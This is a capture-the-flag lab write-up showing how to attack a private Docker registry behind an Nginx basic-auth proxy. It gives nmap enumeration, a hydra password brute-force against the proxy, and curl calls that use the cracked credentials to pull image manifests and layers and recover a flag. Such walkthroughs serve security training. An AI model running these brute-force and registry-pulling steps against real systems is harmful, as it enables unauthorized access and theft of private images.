#### 4. Insecure Docker Registry III

----

![](images/topology.png)

- A protected private Docker registry is deployed behind Nginx in the reverse-proxy configuration. The Nginx is in the same network as your Kali machine, but the registry is not directly reachable from your machine. Also, the Nginx proxy is protected with a popular authentication mechanism. There are some docker images present in the registry, one of which contains the flag.
- Objective: Interact with the private Docker registry, analyze the images and retrieve the flag! 

----

```sh
root@attackdefense:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2416: eth0@if2417: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:0a:01:01:05 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.1.5/24 brd 10.1.1.255 scope global eth0
       valid_lft forever preferred_lft forever
2422: eth1@if2423: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:65:8e:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.101.142.2/24 brd 192.101.142.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~#
```

```sh
root@attackdefense:~# nmap -sV -sC 192.101.142.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-24 06:35 UTC
Nmap scan report for c2u6e3xiba6muq153gclckvuy.temp-network_a-101-142 (192.101.142.3)
Host is up (0.000014s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: 403 Forbidden
MAC Address: 02:42:C0:65:8E:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP addres
```

```sh
root@attackdefense:~# curl http://192.101.142.3
<html>
<head><title>401 Authorization Required</title></head>
<body bgcolor="white">
<center><h1>401 Authorization Required</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl -I http://192.101.142.3
HTTP/1.1 401 Unauthorized
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 24 Jul 2019 06:38:41 GMT
Content-Type: text/html
Content-Length: 204
Connection: keep-alive
WWW-Authenticate: Basic realm="Registry realm"

root@attackdefense:~#
```

```sh
root@attackdefense:~# hydra -l bob -P wordlists/100-common-passwords.txt 192.101.142.3 http-get /
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2019-07-24 06:39:16
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task
[DATA] attacking http-get://192.101.142.3:80//
[80][http-get] host: 192.101.142.3   login: bob   password: bubbles1
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2019-07-24 06:39:17
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl -k -u bob:bubbles1 http://192.101.142.3/v2/_catalog
{"repositories":["trophy"]}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl -k -u bob:bubbles1 http://192.101.142.3/v2/trophy/tags/list
{"name":"trophy","tags":["latest"]}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl -k -u bob:bubbles1 http://192.101.142.3/v2/trophy/manifests/latest
{
   "schemaVersion": 1,
   "name": "trophy",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:e1528abf1daa64e8625a26b63a074a450513275f3f8002087a2e5137ca0e62d6"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"ArgsEscaped\":true,\"Image\":\"sha256:055936d3920576da37aa9bc460d70c5f212028bda1c08c0879aedf03d7a66ea1\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"container_config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) COPY file:e38a412a075d2a1b7e767df24b5e6c93837424d337fdfc4d91b7436ed9e0f80f in /bin/ \"],\"ArgsEscaped\":true,\"Image\":\"sha256:055936d3920576da37aa9bc460d70c5f212028bda1c08c0879aedf03d7a66ea1\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"created\":\"2019-05-13T15:26:32.152591022Z\",\"docker_version\":\"18.09.4\",\"id\":\"7b0d809e47afe2186a655ce1fe956773bb52dfc06214a205a84595c43e3666ec\",\"os\":\"linux\",\"parent\":\"ebc21e1720595259c8ce23ec8af55eddd867a57aa732846c249ca59402072d7a\"}"
      },
      {
         "v1Compatibility": "{\"id\":\"ebc21e1720595259c8ce23ec8af55eddd867a57aa732846c249ca59402072d7a\",\"parent\":\"7869895562ab7b1da94e0293c72d05b096f402beb83c4b15b8887d71d00edb87\",\"created\":\"2019-05-11T00:07:03.510395965Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"7869895562ab7b1da94e0293c72d05b096f402beb83c4b15b8887d71d00edb87\",\"created\":\"2019-05-11T00:07:03.358250803Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:a86aea1f3a7d68f6ae03397b99ea77f2e9ee901c5c59e59f76f93adbb4035913 in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "2Q4E:V3IA:VKAA:M7VQ:NRRN:U54C:RO7X:3CI7:F2YJ:EXC4:6YKG:QS26",
               "kty": "EC",
               "x": "fdFuIPPHzAx4dwkiJkykLFx6PkULybas0xoPms9TRe0",
               "y": "kPXkmSGEIT33EZudk_Ev0q1sVbMT5XiDqueQHl1Q05k"
            },
            "alg": "ES256"
         },
         "signature": "_v19WNYP8mlU7v4IP-_BKOVsrb9ESRr9IzutdQyZw-lWPAVarEqiq-A5ce5IXT1yWWPPRKbZQsI1uYYGx3sZmA",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjI1MzYsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAxOS0wNy0yNFQwNjo0Mzo0MloifQ"
      }
   ]
}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl -s -k -u bob:bubbles1 http://192.101.142.3/v2/trophy/blobs/sha256:e1528abf1daa64e8625a26b63a074a450513275f3f8002087a2e5137ca0e62d6 --output 1.tar
root@attackdefense:~# curl -s -k -u bob:bubbles1 http://192.101.142.3/v2/trophy/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 --output 2.tar
root@attackdefense:~# curl -s -k -u bob:bubbles1 http://192.101.142.3/v2/trophy/blobs/sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10 --output 3.tar
```

```sh
root@attackdefense:~# mkdir compress
root@attackdefense:~# mv *.tar compress/
root@attackdefense:~# cd compress/
root@attackdefense:~/compress# ls -l
total 2704
-rw-r--r-- 1 root root     161 Jul 24 06:47 1.tar
-rw-r--r-- 1 root root      32 Jul 24 06:48 2.tar
-rw-r--r-- 1 root root 2757034 Jul 24 06:48 3.tar
root@attackdefense:~/compress#
```

```sh
root@attackdefense:~/compress# tar xf 1.tar
root@attackdefense:~/compress# tar xf 2.tar
root@attackdefense:~/compress# tar xf 3.tar
```

```sh
root@attackdefense:~/compress# ls -l
total 2772
-rw-r--r--  1 root root     161 Jul 24 06:47 1.tar
-rw-r--r--  1 root root      32 Jul 24 06:48 2.tar
-rw-r--r--  1 root root 2757034 Jul 24 06:48 3.tar
drwxr-xr-x  2 root root    4096 May  9 20:49 bin
drwxr-xr-x  2 root root    4096 May  9 20:49 dev
drwxr-xr-x 15 root root    4096 May  9 20:49 etc
drwxr-xr-x  2 root root    4096 May  9 20:49 home
drwxr-xr-x  5 root root    4096 May  9 20:49 lib
drwxr-xr-x  5 root root    4096 May  9 20:49 media
drwxr-xr-x  2 root root    4096 May  9 20:49 mnt
drwxr-xr-x  2 root root    4096 May  9 20:49 opt
dr-xr-xr-x  2 root root    4096 May  9 20:49 proc
drwx------  2 root root    4096 May  9 20:49 root
drwxr-xr-x  2 root root    4096 May  9 20:49 run
drwxr-xr-x  2 root root    4096 May  9 20:49 sbin
drwxr-xr-x  2 root root    4096 May  9 20:49 srv
drwxr-xr-x  2 root root    4096 May  9 20:49 sys
drwxrwxrwt  2 root root    4096 May  9 20:49 tmp
drwxr-xr-x  7 root root    4096 May  9 20:49 usr
drwxr-xr-x 11 root root    4096 May  9 20:49 var
root@attackdefense:~/compress#
```

```sh
root@attackdefense:~/compress# find . -name *flag* 2>/dev/null
./bin/flag.txt
root@attackdefense:~/compress#
```

```sh
root@attackdefense:~/compress# cat ./bin/flag.txt
50c102ca94d35fe029f6e2eff563cae5
root@attackdefense:~/compress#
```

----

EOF